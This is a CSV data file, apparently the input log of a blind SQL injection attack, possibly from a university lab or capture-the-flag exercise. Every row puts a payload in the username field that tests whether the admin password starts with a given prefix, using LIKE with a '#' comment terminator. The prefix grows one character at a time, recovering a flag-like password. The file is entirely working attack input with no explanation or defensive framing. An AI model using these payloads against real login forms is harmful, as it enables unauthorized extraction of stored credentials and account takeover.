email,username,password
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goM%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goN%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goO %')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goO-%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goO*%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goO/_%'ESCAPE '/')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goO+%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goO=%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goO0%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goO1%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goO2%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goO3%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goO4%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goO5%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goO6%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goO7%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goO8%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goO9%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOa%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOb%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOc%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOde%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdf%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdg%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdh%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdij%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdik%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdil%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdim%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinA%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinB%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinC%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinD%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinE%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinF%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinG%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinH%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinI%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJ %')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJ-%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJ*%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJ/_%'ESCAPE '/')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJ+%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJ=%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJ0%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJ1%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJ2%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJ3%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJ4%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJ5%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJ6%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJ7%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJ8%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJ9%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJa%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJb%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJc%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJd%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeA%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeB%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCD%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCE%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCF%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCG%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCH%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCI%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCJ%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCK%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCL%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCM%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCN%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCO%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCP%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCQ%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCR%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCS%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCT %')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCT-%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCT*%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCT/_%'ESCAPE '/')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCT+%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCT=%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCT0%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCT1%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCT2%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCT3%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCT4%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCT5%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCT6%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCT7%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCT8%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCT9%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTa%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTb%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTc%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTd%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTe%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTf%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTg%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTh%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTij%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTik%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTil%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTim%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTin%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioA%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioB%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioC%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioD%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioE%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioF%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioG%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioH%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioI%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioJ%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioK%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioL%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioM%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioN %')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioN-%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioN*%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioN/_%'ESCAPE '/')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioN+%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioN=%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioN0%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioN1%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioN2%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioN3%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioN4%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioN5%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioN6%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioN7%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioN8%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioN9%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNa%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNb%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcd%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNce%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcf%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcg%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNch%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNci%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcj%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNck%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcl%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcm%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcn%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoA%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoB%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoC%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoD%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoE%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoF%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoG%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoH%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoI%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoJ%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoK%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoL%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoM%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoN %')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoN-%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoN*%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoN/_%'ESCAPE '/')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoN+%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoN=%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoN0%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoN1%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoN2%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoN3%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoN4%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoN5%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoN6%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoN7%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoN8%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoN9%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNa%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNb%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNc%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNd%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNe%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNf%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgh%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgi%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgj%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgk%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgl%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgm%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgn%')#,123123
